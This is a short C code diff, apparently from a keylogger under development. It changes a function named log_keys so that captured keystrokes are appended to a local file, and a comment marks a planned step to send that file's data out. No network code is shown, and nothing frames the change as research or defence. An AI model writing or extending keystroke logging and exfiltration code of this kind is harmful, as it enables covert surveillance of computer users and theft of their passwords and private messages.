@@ -260,7 +260,13 @@ void log_keys(key_package* package) {
       counter = 0;
       // read and write and whee
 
-      print_logged_keys(*package);
+      FILE* package_log = fopen("in.txt", "a");
+      if (package_log == NULL) {
+        error_and_exit("Couldn't open file");
+      }
+      keys_to_file(package_log, *package);
+      // call send data functoin on package_log
+
       if (package->keys_arr_size != 0) {
         reset_structs(package);
       }
